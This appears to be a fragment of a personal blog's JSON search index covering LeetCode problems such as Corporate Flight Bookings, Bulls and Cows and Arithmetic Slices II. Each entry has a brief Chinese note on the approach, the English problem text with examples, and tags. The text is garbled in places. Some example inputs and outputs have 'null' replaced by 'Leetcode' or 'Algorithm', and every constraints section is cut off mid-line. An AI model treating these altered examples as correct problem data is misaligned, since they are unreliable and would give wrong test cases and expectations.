Bookings","url":"/2021/09/leetcode-1109/","content":"動機\n太久沒打真的會忘記\n這是prefix sum阿\n\nProblem\nThere are n flights that are labeled from 1 to n.You are given an array of flight bookings bookings, where bookings[i] = [firsti, lasti, seatsi] represents a booking for flights firsti through lasti (inclusive) with seatsi seats reserved for each flight in the range.Return an array answer of length n, where answer[i] is the total number of seats reserved for flight i. Example 1:Input: bookings = [[1,2,10],[2,3,20],[2,5,25]], n = 5Output: [10,55,45,25,25]Explanation:Flight labels:        1   2   3   4   5Booking 1 reserved:  10  10Booking 2 reserved:      20  20Booking 3 reserved:      25  25  25  25Total seats:         10  55  45  25  25Hence, answer = [10,55,45,25,25]Example 2:Input: bookings = [[1,2,10],[2,2,15]], n = 2Output: [10,25]Explanation:Flight labels:        1   2Booking 1 reserved:  10  10Booking 2 reserved:      15Total seats:         10  25Hence, answer = [10,25] Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Prefix Sum"]},{"title":"leetcode-1111 - Maximum Nesting Depth of Two Valid Parentheses Strings","url":"/2021/09/leetcode-1111/","content":"動機\n題目寫得很爛，但題目本身很有趣!!\n題目想做的事是把string的括號分成兩組，讓兩組的深度越小越好\n回傳每個括號是分配到哪一組\n\nProblem\nA string is a valid parentheses string (denoted VPS) if and only if it consists of \"(\" and \")\" characters only, and:It is the empty string, orIt can be written as AB (A concatenated with B), where A and B are VPS's, orIt can be written as (A), where A is a VPS.We can similarly define the nesting depth depth(S) of any VPS S as follows:depth(\"\") = 0depth(A + B) = max(depth(A), depth(B)), where A and B are VPS'sdepth(\"(\" + A + \")\") = 1 + depth(A), where A is a VPS.For example,  \"\", \"()()\", and \"()(()())\" are VPS's (with nesting depths 0, 1, and 2), and \")(\" and \"(()\" are not VPS's. Given a VPS seq, split it into two disjoint subsequences A and B, such that A and B are VPS's (and A.length + B.length = seq.length).Now choose any such A and B such that max(depth(A), depth(B)) is the minimum possible value.Return an answer array (of length seq.length) that encodes such a choice of A and B:  answer[i] = 0 if seq[i] is part of A, else answer[i] = 1.  Note that even though multiple answers may exist, you may return any of them. Example 1:Input: seq = \"(()())\"Output: [0,1,1,1,1,0]Example 2:Input: seq = \"()(())()\"Output: [0,0,0,1,1,0,1,1] Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["String","Stack"]},{"title":"leetcode-1161 - Maximum Level Sum of a Binary Tree","url":"/2021/09/leetcode-1161/","content":"動機\n其實有level也可以用dfs的\n\nProblem\nGiven the root of a binary tree, the level of its root is 1, the level of its children is 2, and so on.Return the smallest level x such that the sum of all the values of nodes at level x is maximal. Example 1:Input: root = [1,7,0,7,-8,Leetcode,null]Output: 2Explanation: Level 1 sum = 1.Level 2 sum = 7 + 0 = 7.Level 3 sum = 7 + -8 = -1.So we return the level with the maximum sum which is level 2.Example 2:Input: root = [989,null,10250,98693,-89388,null,null,null,-32127]Output: 2 Constraints:The number of nodes in the tree is in the range [1, 104].-105 ","categories":["Algorithm","Leetcode"],"tags":["Breadth-First Search","Binary Tree","Tree"]},{"title":"leetcode-1189 - Maximum Number of Balloons","url":"/2021/09/leetcode-1189/","content":"動機\n\nProblem\nGiven a string text, you want to use the characters of text to form as many instances of the word \"balloon\" as possible.You can use each character in text at most once. Return the maximum number of instances that can be formed. Example 1:Input: text = \"nlaebolko\"Output: 1Example 2:Input: text = \"loonbalxballpoon\"Output: 2Example 3:Input: text = \"leetcode\"Output: 0 Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["String","Hash Table","Counting"]},{"title":"leetcode-1286 - Iterator for Combination","url":"/2021/09/leetcode-1286/","content":"動機\n硬幹，或是好像看得懂的case study?\n\nProblem\nDesign the CombinationIterator class:CombinationIterator(string characters, int combinationLength) Initializes the object with a string characters of sorted distinct lowercase English letters and a number combinationLength as arguments.next() Returns the next combination of length combinationLength in lexicographical order.hasNext() Returns true if and only if there exists a next combination. Example 1:Input[\"CombinationIterator\", \"next\", \"hasNext\", \"next\", \"hasNext\", \"next\", \"hasNext\"][[\"abc\", 2], [], [], [], [], [], []]Output[Algorithm, Leetcode, \"ab\", true, \"ac\", true, \"bc\", false]ExplanationCombinationIterator itr = new CombinationIterator(\"abc\", 2);itr.next();    // return \"ab\"itr.hasNext(); // return Trueitr.next();    // return \"ac\"itr.hasNext(); // return Trueitr.next();    // return \"bc\"itr.hasNext(); // return False Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["String","Design","Backtracking","Iterator"]},{"title":"leetcode-1288 - Remove Covered Intervals","url":"/2021/09/leetcode-1288/","content":"動機\n就是merge interval，但要記得紀錄merge幾個interval\n\nProblem\nGiven an array intervals where intervals[i] = [li, ri] represent the interval [li, ri), remove all intervals that are covered by another interval in the list.The interval [a, b) is covered by the interval [c, d) if and only if c ","categories":["Algorithm","Leetcode"],"tags":["Array","Sorting"]},{"title":"leetcode-1373 - Maximum Sum BST in Binary Tree","url":"/2021/09/leetcode-1373/","content":"動機\npost order很重要!!\n\nProblem\nGiven a binary tree root, return the maximum sum of all keys of any sub-tree which is also a Binary Search Tree (BST).Assume a BST is defined as follows:The left subtree of a node contains only nodes with keys less than the node's key.The right subtree of a node contains only nodes with keys greater than the node's key.Both the left and right subtrees must also be binary search trees. Example 1:Input: root = [1,4,3,2,4,2,5,Leetcode,null,null,null,null,null,4,6]Output: 20Explanation: Maximum sum in a valid Binary search tree is obtained in root node with key equal to 3.Example 2:Input: root = [4,3,null,1,2]Output: 2Explanation: Maximum sum in a valid Binary search tree is obtained in a single root node with key equal to 2.Example 3:Input: root = [-4,-2,-5]Output: 0Explanation: All values are negatives. Return an empty BST.Example 4:Input: root = [2,1,3]Output: 6Example 5:Input: root = [5,4,8,3,null,6,3]Output: 7 Constraints:The number of nodes in the tree is in the range [1, 4 * 104].-4 * 104 ","categories":["Algorithm","Leetcode"],"tags":["Dynamic Programming","Depth-First Search","Binary Tree","Tree","Binary Search Tree"]},{"title":"leetcode-1386 - Cinema Seat Allocation","url":"/2021/09/leetcode-1386/","content":"動機\n十分的哭，1 &lt;= n &lt;= 10^9\n會不會太大\n\nProblem\nA cinema has n rows of seats, numbered from 1 to n and there are ten seats in each row, labelled from 1 to 10 as shown in the figure above.Given the array reservedSeats containing the numbers of seats already reserved, for example, reservedSeats[i] = [3,8] means the seat located in row 3 and labelled with 8 is already reserved.Return the maximum number of four-person groups you can assign on the cinema seats. A four-person group occupies four adjacent seats in one single row. Seats across an aisle (such as [3,3] and [3,4]) are not considered to be adjacent, but there is an exceptional case on which an aisle split a four-person group, in that case, the aisle split a four-person group in the middle, which means to have two people on each side. Example 1:Input: n = 3, reservedSeats = [[1,2],[1,3],[1,8],[2,6],[3,1],[3,10]]Output: 4Explanation: The figure above shows the optimal allocation for four groups, where seats mark with blue are already reserved and contiguous seats mark with orange are for one group.Example 2:Input: n = 2, reservedSeats = [[2,1],[1,8],[2,6]]Output: 2Example 3:Input: n = 4, reservedSeats = [[4,3],[1,4],[4,6],[1,7]]Output: 4 Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Bit Manipulation","Greedy","Hash Table"]},{"title":"leetcode-1441 - Build an Array With Stack Operations","url":"/2021/09/leetcode-1441/","content":"動機\n就硬幹\n\nProblem\nGiven an array target and an integer n. In each iteration, you will read a number from  list = &#123;1,2,3..., n&#125;.Build the target array using the following operations:Push: Read a new element from the beginning list, and push it in the array.Pop: delete the last element of the array.If the target array is already built, stop reading more elements.Return the operations to build the target array. You are guaranteed that the answer is unique. Example 1:Input: target = [1,3], n = 3Output: [\"Push\",\"Push\",\"Pop\",\"Push\"]Explanation: Read number 1 and automatically push in the array -> [1]Read number 2 and automatically push in the array then Pop it -> [1]Read number 3 and automatically push in the array -> [1,3]Example 2:Input: target = [1,2,3], n = 3Output: [\"Push\",\"Push\",\"Push\"]Example 3:Input: target = [1,2], n = 4Output: [\"Push\",\"Push\"]Explanation: You only need to read the first 2 numbers and stop.Example 4:Input: target = [2,3,4], n = 4Output: [\"Push\",\"Pop\",\"Push\",\"Push\",\"Push\"] Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Stack","Simulation"]},{"title":"leetcode-1482 - Minimum Number of Days to Make m Bouquets","url":"/2021/09/leetcode-1482/","content":"動機\n\n只要有某個範圍是連續遞增就可以用bsearch!!\n寫bsearch就是考慮那邊要丟掉就設成a = mid+1\n\n\nProblem\nGiven an integer array bloomDay, an integer m and an integer k.We need to make m bouquets. To make a bouquet, you need to use k adjacent flowers from the garden.The garden consists of n flowers, the ith flower will bloom in the bloomDay[i] and then can be used in exactly one bouquet.Return the minimum number of days you need to wait to be able to make m bouquets from the garden. If it is impossible to make m bouquets return -1. Example 1:Input: bloomDay = [1,10,3,10,2], m = 3, k = 1Output: 3Explanation: Let's see what happened in the first three days. x means flower bloomed and _ means flower didn't bloom in the garden.We need 3 bouquets each should contain 1 flower.After day 1: [x, _, _, _, _]   // we can only make one bouquet.After day 2: [x, _, _, _, x]   // we can only make two bouquets.After day 3: [x, _, x, _, x]   // we can make 3 bouquets. The answer is 3.Example 2:Input: bloomDay = [1,10,3,10,2], m = 3, k = 2Output: -1Explanation: We need 3 bouquets each has 2 flowers, that means we need 6 flowers. We only have 5 flowers so it is impossible to get the needed bouquets and we return -1.Example 3:Input: bloomDay = [7,7,7,7,12,7,7], m = 2, k = 3Output: 12Explanation: We need 2 bouquets each should have 3 flowers.Here's the garden after the 7 and 12 days:After day 7: [x, x, x, x, _, x, x]We can make one bouquet of the first three flowers that bloomed. We cannot make another bouquet from the last three flowers that bloomed because they are not adjacent.After day 12: [x, x, x, x, x, x, x]It is obvious that we can make two bouquets in different ways.Example 4:Input: bloomDay = [1000000000,1000000000], m = 1, k = 1Output: 1000000000Explanation: You need to wait 1000000000 days to have a flower ready for a bouquet.Example 5:Input: bloomDay = [1,10,2,9,3,8,4,7,5,6], m = 4, k = 2Output: 9 Constraints:bloomDay.length == n1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Binary Search"]},{"title":"leetcode-1509 - Minimum Difference Between Largest and Smallest Value in Three Moves","url":"/2021/09/leetcode-1509/","content":"動機\n當初以為只要把最大或最小3個去掉就好…\n\nProblem\nGiven an array nums, you are allowed to choose one element of nums and change it by any value in one move.Return the minimum difference between the largest and smallest value of nums after perfoming at most 3 moves. Example 1:Input: nums = [5,3,2,4]Output: 0Explanation: Change the array [5,3,2,4] to [2,2,2,2].The difference between the maximum and minimum is 2-2 = 0.Example 2:Input: nums = [1,5,0,10,14]Output: 1Explanation: Change the array [1,5,0,10,14] to [1,1,0,1,1]. The difference between the maximum and minimum is 1-0 = 1.Example 3:Input: nums = [6,6,0,1,1,4,6]Output: 2Example 4:Input: nums = [1,5,6,14,15]Output: 1 Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Greedy","Sorting"]},{"title":"leetcode-1512 - Number of Good Pairs","url":"/2021/09/leetcode-1512/","content":"動機\n複習組合數\n\nProblem\nGiven an array of integers nums, return the number of good pairs.A pair (i, j) is called good if nums[i] == nums[j] and i < j. Example 1:Input: nums = [1,2,3,1,1,3]Output: 4Explanation: There are 4 good pairs (0,3), (0,4), (3,4), (2,5) 0-indexed.Example 2:Input: nums = [1,1,1,1]Output: 6Explanation: Each pair in the array are good.Example 3:Input: nums = [1,2,3]Output: 0 Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Math","Hash Table","Counting"]},{"title":"leetcode-1525 - Number of Good Ways to Split a String","url":"/2021/09/leetcode-1525/","content":"動機\n可以當成有一個bar，從左邊推到右邊\n\nProblem\nYou are given a string s, a split is called good if you can split s into 2 non-empty strings p and q where its concatenation is equal to s and the number of distinct letters in p and q are the same.Return the number of good splits you can make in s. Example 1:Input: s = \"aacaba\"Output: 2Explanation: There are 5 ways to split \"aacaba\" and 2 of them are good. (\"a\", \"acaba\") Left string and right string contains 1 and 3 different letters respectively.(\"aa\", \"caba\") Left string and right string contains 1 and 3 different letters respectively.(\"aac\", \"aba\") Left string and right string contains 2 and 2 different letters respectively (good split).(\"aaca\", \"ba\") Left string and right string contains 2 and 2 different letters respectively (good split).(\"aacab\", \"a\") Left string and right string contains 3 and 1 different letters respectively.Example 2:Input: s = \"abcd\"Output: 1Explanation: Split the string as follows (\"ab\", \"cd\").Example 3:Input: s = \"aaaaa\"Output: 4Explanation: All possible splits are good.Example 4:Input: s = \"acbadbaada\"Output: 2 Constraints:s contains only lowercase English letters.1 ","categories":["Algorithm","Leetcode"],"tags":["Dynamic Programming","String","Bit Manipulation"]},{"title":"leetcode-1541 - Minimum Insertions to Balance a Parentheses String","url":"/2021/09/leetcode-1541/","content":"動機\n先把礙事的處理掉就好!!\n\nProblem\nGiven a parentheses string s containing only the characters '(' and ')'. A parentheses string is balanced if:Any left parenthesis '(' must have a corresponding two consecutive right parenthesis '))'.Left parenthesis '(' must go before the corresponding two consecutive right parenthesis '))'.In other words, we treat '(' as openning parenthesis and '))' as closing parenthesis.For example, \"())\", \"())(())))\" and \"(())())))\" are balanced, \")()\", \"()))\" and \"(()))\" are not balanced.You can insert the characters '(' and ')' at any position of the string to balance it if needed.Return the minimum number of insertions needed to make s balanced. Example 1:Input: s = \"(()))\"Output: 1Explanation: The second '(' has two matching '))', but the first '(' has only ')' matching. We need to to add one more ')' at the end of the string to be \"(())))\" which is balanced.Example 2:Input: s = \"())\"Output: 0Explanation: The string is already balanced.Example 3:Input: s = \"))())(\"Output: 3Explanation: Add '(' to match the first '))', Add '))' to match the last '('.Example 4:Input: s = \"((((((\"Output: 12Explanation: Add 12 ')' to balance the string.Example 5:Input: s = \")))))))\"Output: 5Explanation: Add 4 '(' at the beginning of the string and one ')' at the end. The string becomes \"(((())))))))\". Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["String","Stack","Greedy"]},{"title":"leetcode-1629 - Slowest Key","url":"/2021/09/leetcode-1629/","content":"動機\n水一波\n\nProblem\nA newly designed keypad was tested, where a tester pressed a sequence of n keys, one at a time.You are given a string keysPressed of length n, where keysPressed[i] was the ith key pressed in the testing sequence, and a sorted list releaseTimes, where releaseTimes[i] was the time the ith key was released. Both arrays are 0-indexed. The 0th key was pressed at the time 0, and every subsequent key was pressed at the exact time the previous key was released.The tester wants to know the key of the keypress that had the longest duration. The ith keypress had a duration of releaseTimes[i] - releaseTimes[i - 1], and the 0th keypress had a duration of releaseTimes[0].Note that the same key could have been pressed multiple times during the test, and these multiple presses of the same key may not have had the same duration.Return the key of the keypress that had the longest duration. If there are multiple such keypresses, return the lexicographically largest key of the keypresses. Example 1:Input: releaseTimes = [9,29,49,50], keysPressed = \"cbcd\"Output: \"c\"Explanation: The keypresses were as follows:Keypress for 'c' had a duration of 9 (pressed at time 0 and released at time 9).Keypress for 'b' had a duration of 29 - 9 = 20 (pressed at time 9 right after the release of the previous character and released at time 29).Keypress for 'c' had a duration of 49 - 29 = 20 (pressed at time 29 right after the release of the previous character and released at time 49).Keypress for 'd' had a duration of 50 - 49 = 1 (pressed at time 49 right after the release of the previous character and released at time 50).The longest of these was the keypress for 'b' and the second keypress for 'c', both with duration 20.'c' is lexicographically larger than 'b', so the answer is 'c'.Example 2:Input: releaseTimes = [12,23,36,46,62], keysPressed = \"spuda\"Output: \"a\"Explanation: The keypresses were as follows:Keypress for 's' had a duration of 12.Keypress for 'p' had a duration of 23 - 12 = 11.Keypress for 'u' had a duration of 36 - 23 = 13.Keypress for 'd' had a duration of 46 - 36 = 10.Keypress for 'a' had a duration of 62 - 46 = 16.The longest of these was the keypress for 'a' with duration 16. Constraints:releaseTimes.length == nkeysPressed.length == n2 ","categories":["Algorithm","Leetcode"],"tags":["String","Array"]},{"title":"leetcode-1631 - Path With Minimum Effort","url":"/2021/09/leetcode-1631/","content":"動機\n最小路徑? no,no\n最短路徑!!!\n\nProblem\nYou are a hiker preparing for an upcoming hike. You are given heights, a 2D array of size rows x columns, where heights[row][col] represents the height of cell (row, col). You are situated in the top-left cell, (0, 0), and you hope to travel to the bottom-right cell, (rows-1, columns-1) (i.e., 0-indexed). You can move up, down, left, or right, and you wish to find a route that requires the minimum effort.A route's effort is the maximum absolute difference in heights between two consecutive cells of the route.Return the minimum effort required to travel from the top-left cell to the bottom-right cell. Example 1:Input: heights = [[1,2,2],[3,8,2],[5,3,5]]Output: 2Explanation: The route of [1,3,5,3,5] has a maximum absolute difference of 2 in consecutive cells.This is better than the route of [1,2,2,2,5], where the maximum absolute difference is 3.Example 2:Input: heights = [[1,2,3],[3,8,4],[5,3,5]]Output: 1Explanation: The route of [1,2,3,4,5] has a maximum absolute difference of 1 in consecutive cells, which is better than route [1,3,5,3,5].Example 3:Input: heights = [[1,2,1,1,1],[1,2,1,2,1],[1,2,1,2,1],[1,2,1,2,1],[1,1,1,2,1]]Output: 0Explanation: This route does not require any effort. Constraints:rows == heights.lengthcolumns == heights[i].length1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Matrix","Union Find","Breadth-First Search","Depth-First Search","Binary Search","Heap (Priority Queue)"]},{"title":"leetcode-1774 - Closest Dessert Cost","url":"/2021/09/leetcode-1774/","content":"動機\n最好幾次的coin change\n\nProblem\nYou would like to make dessert and are preparing to buy the ingredients. You have n ice cream base flavors and m types of toppings to choose from. You must follow these rules when making your dessert:There must be exactly one ice cream base.You can add one or more types of topping or have no toppings at all.There are at most two of each type of topping.You are given three inputs:baseCosts, an integer array of length n, where each baseCosts[i] represents the price of the ith ice cream base flavor.toppingCosts, an integer array of length m, where each toppingCosts[i] is the price of one of the ith topping.target, an integer representing your target price for dessert.You want to make a dessert with a total cost as close to target as possible.Return the closest possible cost of the dessert to target. If there are multiple, return the lower one. Example 1:Input: baseCosts = [1,7], toppingCosts = [3,4], target = 10Output: 10Explanation: Consider the following combination (all 0-indexed):- Choose base 1: cost 7- Take 1 of topping 0: cost 1 x 3 = 3- Take 0 of topping 1: cost 0 x 4 = 0Total: 7 + 3 + 0 = 10.Example 2:Input: baseCosts = [2,3], toppingCosts = [4,5,100], target = 18Output: 17Explanation: Consider the following combination (all 0-indexed):- Choose base 1: cost 3- Take 1 of topping 0: cost 1 x 4 = 4- Take 2 of topping 1: cost 2 x 5 = 10- Take 0 of topping 2: cost 0 x 100 = 0Total: 3 + 4 + 10 + 0 = 17. You cannot make a dessert with a total cost of 18.Example 3:Input: baseCosts = [3,10], toppingCosts = [2,5], target = 9Output: 8Explanation: It is possible to make desserts with cost 8 and 10. Return 8 as it is the lower cost.Example 4:Input: baseCosts = [10], toppingCosts = [1], target = 1Output: 10Explanation: Notice that you don't have to have any toppings, but you must have exactly one base. Constraints:n == baseCosts.lengthm == toppingCosts.length1 ","categories":["Algorithm","Leetcode"],"tags":["Dynamic Programming","Array","Backtracking"]},{"title":"leetcode-1863 - Sum of All Subset XOR Totals","url":"/2021/09/leetcode-1863/","content":"動機\n複習subset的backtrack\n\nProblem\nThe XOR total of an array is defined as the bitwise XOR of all its elements, or 0 if the array is empty.For example, the XOR total of the array [2,5,6] is 2 XOR 5 XOR 6 = 1.Given an array nums, return the sum of all XOR totals for every subset of nums. Note: Subsets with the same elements should be counted multiple times.An array a is a subset of an array b if a can be obtained from b by deleting some (possibly zero) elements of b. Example 1:Input: nums = [1,3]Output: 6Explanation: The 4 subsets of [1,3] are:- The empty subset has an XOR total of 0.- [1] has an XOR total of 1.- [3] has an XOR total of 3.- [1,3] has an XOR total of 1 XOR 3 = 2.0 + 1 + 3 + 2 = 6Example 2:Input: nums = [5,1,6]Output: 28Explanation: The 8 subsets of [5,1,6] are:- The empty subset has an XOR total of 0.- [5] has an XOR total of 5.- [1] has an XOR total of 1.- [6] has an XOR total of 6.- [5,1] has an XOR total of 5 XOR 1 = 4.- [5,6] has an XOR total of 5 XOR 6 = 3.- [1,6] has an XOR total of 1 XOR 6 = 7.- [5,1,6] has an XOR total of 5 XOR 1 XOR 6 = 2.0 + 5 + 1 + 6 + 4 + 3 + 7 + 2 = 28Example 3:Input: nums = [3,4,5,6,7,8]Output: 480Explanation: The sum of all XOR totals for every subset is 480. Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Bit Manipulation","Backtracking"]},{"title":"leetcode-299 - Bulls and Cows","url":"/2021/09/leetcode-299/","content":"動機\n就硬幹\n\nProblem\nYou are playing the Bulls and Cows game with your friend.You write down a secret number and ask your friend to guess what the number is. When your friend makes a guess, you provide a hint with the following info:The number of \"bulls\", which are digits in the guess that are in the correct position.The number of \"cows\", which are digits in the guess that are in your secret number but are located in the wrong position. Specifically, the non-bull digits in the guess that could be rearranged such that they become bulls.Given the secret number secret and your friend's guess guess, return the hint for your friend's guess.The hint should be formatted as \"xAyB\", where x is the number of bulls and y is the number of cows. Note that both secret and guess may contain duplicate digits. Example 1:Input: secret = \"1807\", guess = \"7810\"Output: \"1A3B\"Explanation: Bulls are connected with a '|' and cows are underlined:\"1807\"  |\"7810\"Example 2:Input: secret = \"1123\", guess = \"0111\"Output: \"1A1B\"Explanation: Bulls are connected with a '|' and cows are underlined:\"1123\"        \"1123\"  |      or     |\"0111\"        \"0111\"Note that only one of the two unmatched 1s is counted as a cow since the non-bull digits can only be rearranged to allow one 1 to be a bull.Example 3:Input: secret = \"1\", guess = \"0\"Output: \"0A0B\"Example 4:Input: secret = \"1\", guess = \"1\"Output: \"1A0B\" Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["String","Hash Table","Counting"]},{"title":"leetcode-319 - Bulb Switcher","url":"/2021/09/leetcode-319/","content":"動機\n有趣的數學題\n\nProblem\nThere are n bulbs that are initially off. You first turn on all the bulbs, then you turn off every second bulb.On the third round, you toggle every third bulb (turning on if it's off or turning off if it's on). For the ith round, you toggle every i bulb. For the nth round, you only toggle the last bulb.Return the number of bulbs that are on after n rounds. Example 1:Input: n = 3Output: 1Explanation: At first, the three bulbs are [off, off, off].After the first round, the three bulbs are [on, on, on].After the second round, the three bulbs are [on, off, on].After the third round, the three bulbs are [on, off, off]. So you should return 1 because there is only one bulb is on.Example 2:Input: n = 0Output: 0Example 3:Input: n = 1Output: 1 Constraints:0 ","categories":["Algorithm","Leetcode"],"tags":["Math","Brainteaser"]},{"title":"leetcode-330 - Patching Array","url":"/2021/09/leetcode-330/","content":"動機\n有點魔法的一題\n\nProblem\nGiven a sorted integer array nums and an integer n, add/patch elements to the array such that any number in the range [1, n] inclusive can be formed by the sum of some elements in the array.Return the minimum number of patches required. Example 1:Input: nums = [1,3], n = 6Output: 1Explanation:Combinations of nums are [1], [3], [1,3], which form possible sums of: 1, 3, 4.Now if we add/patch 2 to nums, the combinations are: [1], [2], [3], [1,3], [2,3], [1,2,3].Possible sums are 1, 2, 3, 4, 5, 6, which now covers the range [1, 6].So we only need 1 patch.Example 2:Input: nums = [1,5,10], n = 20Output: 2Explanation: The two patches can be [2, 4].Example 3:Input: nums = [1,2,2], n = 5Output: 0 Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Greedy"]},{"title":"leetcode-357 - Count Numbers with Unique Digits","url":"/2021/09/leetcode-357/","content":"動機\n高中排列組合\n\nProblem\nGiven an integer n, return the count of all numbers with unique digits, x, where 0 ","categories":["Algorithm","Leetcode"],"tags":["Dynamic Programming","Math","Backtracking"]},{"title":"leetcode-372 - Super Pow","url":"/2021/09/leetcode-372/","content":"動機\n也是數學，(a*b) % c等於(a%c)*(b%c)\n\nProblem\nYour task is to calculate ab mod 1337 where a is a positive integer and b is an extremely large positive integer given in the form of an array. Example 1:Input: a = 2, b = [3]Output: 8Example 2:Input: a = 2, b = [1,0]Output: 1024Example 3:Input: a = 1, b = [4,3,3,8,5,2]Output: 1Example 4:Input: a = 2147483647, b = [2,0,0]Output: 1198 Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Math","Divide and Conquer"]},{"title":"leetcode-391 - Perfect Rectangle","url":"/2021/09/leetcode-391/","content":"動機\n原來有symmetric difference\n\nProblem\nGiven an array rectangles where rectangles[i] = [xi, yi, ai, bi] represents an axis-aligned rectangle. The bottom-left point of the rectangle is (xi, yi) and the top-right point of it is (ai, bi).Return true if all the rectangles together form an exact cover of a rectangular region. Example 1:Input: rectangles = [[1,1,3,3],[3,1,4,2],[3,2,4,4],[1,3,2,4],[2,3,3,4]]Output: trueExplanation: All 5 rectangles together form an exact cover of a rectangular region.Example 2:Input: rectangles = [[1,1,2,3],[1,3,2,4],[3,1,4,2],[3,2,4,4]]Output: falseExplanation: Because there is a gap between the two rectangular regions.Example 3:Input: rectangles = [[1,1,3,3],[3,1,4,2],[1,3,2,4],[3,2,4,4]]Output: falseExplanation: Because there is a gap in the top center.Example 4:Input: rectangles = [[1,1,3,3],[3,1,4,2],[1,3,2,4],[2,2,4,4]]Output: falseExplanation: Because two of the rectangles overlap with each other. Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Line Sweep"]},{"title":"leetcode-410 - Split Array Largest Sum","url":"/2021/09/leetcode-410/","content":"動機\n經典的binary search題\n\n注意結果是不是連續的!!\n\n\nProblem\nGiven an array nums which consists of non-negative integers and an integer m, you can split the array into m non-empty continuous subarrays.Write an algorithm to minimize the largest sum among these m subarrays. Example 1:Input: nums = [7,2,5,10,8], m = 2Output: 18Explanation:There are four ways to split nums into two subarrays.The best way is to split it into [7,2,5] and [10,8],where the largest sum among the two subarrays is only 18.Example 2:Input: nums = [1,2,3,4,5], m = 2Output: 9Example 3:Input: nums = [1,4,4], m = 3Output: 4 Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Dynamic Programming","Array","Binary Search","Greedy"]},{"title":"leetcode-413 - Arithmetic Slices","url":"/2021/09/leetcode-413/","content":"動機\n與446差在只看每個位置的前一個就好\n\nProblem\nAn integer array is called arithmetic if it consists of at least three elements and if the difference between any two consecutive elements is the same.For example, [1,3,5,7,9], [7,7,7,7], and [3,-1,-5,-9] are arithmetic sequences.Given an integer array nums, return the number of arithmetic subarrays of nums.A subarray is a contiguous subsequence of the array. Example 1:Input: nums = [1,2,3,4]Output: 3Explanation: We have 3 arithmetic slices in nums: [1, 2, 3], [2, 3, 4] and [1,2,3,4] itself.Example 2:Input: nums = [1]Output: 0 Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Dynamic Programming","Array"]},{"title":"leetcode-446 - Arithmetic Slices II - Subsequence","url":"/2021/09/leetcode-446/","content":"動機\n如果沒有大於3的限制就很簡單\n同時，又是一題只能用bottom-up的dp\n\nProblem\nGiven an integer array nums, return the number of all the arithmetic subsequences of nums.A sequence of numbers is called arithmetic if it consists of at least three elements and if the difference between any two consecutive elements is the same.For example, [1, 3, 5, 7, 9], [7, 7, 7, 7], and [3, -1, -5, -9] are arithmetic sequences.For example, [1, 1, 2, 5, 7] is not an arithmetic sequence.A subsequence of an array is a sequence that can be formed by removing some elements (possibly none) of the array.For example, [2,5,10] is a subsequence of [1,2,1,2,4,1,5,10].The test cases are generated so that the answer fits in 32-bit integer. Example 1:Input: nums = [2,4,6,8,10]Output: 7Explanation: All arithmetic subsequence slices are:[2,4,6][4,6,8][6,8,10][2,4,6,8][4,6,8,10][2,4,6,8,10][2,6,10]Example 2:Input: nums = [7,7,7,7,7]Output: 16Explanation: Any subsequence of this array is arithmetic. Constraints:1  ","categories":["Algorithm","Leetcode"],"tags":["Dynamic Programming","Array"]},{"title":"leetcode-475 - Heaters","url":"/2021/09/leetcode-475/","content":"動機\nbsearch的用法\n\n猜數字\n找位置\n\n\nProblem\nWinter is coming! During the contest, your first job is to design a standard heater with a fixed warm radius to warm all the houses.Every house can be warmed, as long as the house is within the heater's warm radius range. Given the positions of houses and heaters on a horizontal line, return the minimum radius standard of heaters so that those heaters could cover all houses.Notice that all the heaters follow your radius standard, and the warm radius will the same. Example 1:Input: houses = [1,2,3], heaters = [2]Output: 1Explanation: The only heater was placed in the position 2, and if we use the radius 1 standard, then all the houses can be warmed.Example 2:Input: houses = [1,2,3,4], heaters = [1,4]Output: 1Explanation: The two heater was placed in the position 1 and 4. We need to use radius 1 standard, then all the houses can be warmed.Example 3:Input: houses = [1,5], heaters = [2]Output: 3 Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Binary Search","Sorting"]},{"title":"leetcode-482 - License Key Formatting","url":"/2021/09/leetcode-482/","content":"動機\n不要忘了reverse很好用\n\nProblem\nYou are given a license key represented as a string s that consists of only alphanumeric characters and dashes. The string is separated into n + 1 groups by n dashes. You are also given an integer k.We want to reformat the string s such that each group contains exactly k characters, except for the first group, which could be shorter than k but still must contain at least one character. Furthermore, there must be a dash inserted between two groups, and you should convert all lowercase letters to uppercase.Return the reformatted license key. Example 1:Input: s = \"5F3Z-2e-9-w\", k = 4Output: \"5F3Z-2E9W\"Explanation: The string s has been split into two parts, each part has 4 characters.Note that the two extra dashes are not needed and can be removed.Example 2:Input: s = \"2-5g-3-J\", k = 2Output: \"2-5G-3J\"Explanation: The string s has been split into three parts, each part has 2 characters except the first part as it could be shorter as mentioned above. Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["String"]},{"title":"leetcode-565 - Array Nesting","url":"/2021/09/leetcode-565/","content":"動機\n0~n就是loop!!\n\nProblem\nYou are given an integer array nums of length n where nums is a permutation of the numbers in the range [0, n - 1].You should build a set s[k] = &#123;nums[k], nums[nums[k]], nums[nums[nums[k]]], ... &#125; subjected to the following rule:The first element in s[k] starts with the selection of the element nums[k] of index = k.The next element in s[k] should be nums[nums[k]], and then nums[nums[nums[k]]], and so on.We stop adding right before a duplicate element occurs in s[k].Return the longest length of a set s[k]. Example 1:Input: nums = [5,4,0,3,1,6,2]Output: 4Explanation: nums[0] = 5, nums[1] = 4, nums[2] = 0, nums[3] = 3, nums[4] = 1, nums[5] = 6, nums[6] = 2.One of the longest sets s[k]:s[0] = {nums[0], nums[5], nums[6], nums[2]} 